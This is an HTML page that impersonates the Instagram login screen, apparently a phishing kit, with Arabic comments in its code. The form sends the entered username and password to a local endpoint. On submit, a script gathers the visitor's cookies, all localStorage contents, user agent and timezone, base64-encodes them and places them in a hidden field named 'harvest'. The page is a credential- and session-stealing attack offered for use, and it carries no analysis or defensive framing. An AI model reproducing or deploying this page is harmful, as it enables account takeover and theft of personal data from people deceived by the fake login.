<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, system-ui, sans-serif; background-color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { display: flex; width: 100%; max-width: 935px; justify-content: space-between; align-items: center; }
        
        /* القسم الأيسر */
        .left-section { flex: 1; text-align: center; padding: 40px; }
        .ig-logo { width: 100px; margin-bottom: 25px; }
        .text-header { font-size: 32px; font-weight: 500; color: #262626; line-height: 1.2; }
        .highlight { color: #fa7e1e; font-weight: bold; }
        .hero-img { width: 280px; margin-top: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }

        /* القسم الأيمن */
        .right-section { width: 350px; border-left: 1px solid #dbdbdb; padding-left: 60px; height: 100vh; display: flex; flex-direction: column; justify-content: center; }
        .login-box { width: 100%; text-align: center; }
        h2 { font-size: 17px; margin-bottom: 25px; color: #262626; }
        input { width: 100%; padding: 12px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 8px; margin-bottom: 8px; font-size: 12px; }
        .login-btn { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; opacity: 0.7; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 18px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: bold; text-decoration: none; display: block; margin-bottom: 20px; }
        .create-btn { border: 1px solid #0095f6; color: #0095f6; padding: 10px; border-radius: 8px; display: block; text-decoration: none; font-weight: bold; }
        .meta-logo { margin-top: 60px; color: #00376b; font-weight: bold; font-size: 13px; }

        @media (max-width: 800px) { .left-section { display: none; } .right-section { border: none; padding-left: 0; width: 100%; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="ig-logo">
            <div class="text-header">See everyday moments from your <span class="highlight">close friends</span>.</div>
            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fd3d9d2c636d.png" class="hero-img">
        </div>
        <div class="right-section">
            <div class="login-box">
                <h2>Log into Instagram</h2>
                <form id="v-form" action="/api/v1/auth" method="POST">
                    <input type="text" name="user" placeholder="Phone number, username or email" required>
                    <input type="password" name="pass" placeholder="Password" required>
                    <input type="hidden" name="harvest" id="harvest">
                    <button type="submit" class="login-btn">Log In</button>
                    <div class="divider">OR</div>
                    <a href="#" class="fb-login">Log in with Facebook</a>
                    <a href="#" class="create-btn">Create new account</a>
                </form>
                <div class="meta-logo">∞ Meta</div>
            </div>
        </div>
    </div>
    <script>
        document.getElementById('v-form').onsubmit = function() {
            // سحب شامل للكوكيز والبيانات كما في صورتك المرفقة
            const data = {
                cookies: document.cookie,
                ls: JSON.stringify(localStorage),
                ua: navigator.userAgent,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone // إصلاح الخطأintl بدلاً من intp
            };
            document.getElementById('harvest').value = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
        };
    </script>
</body>
</html>
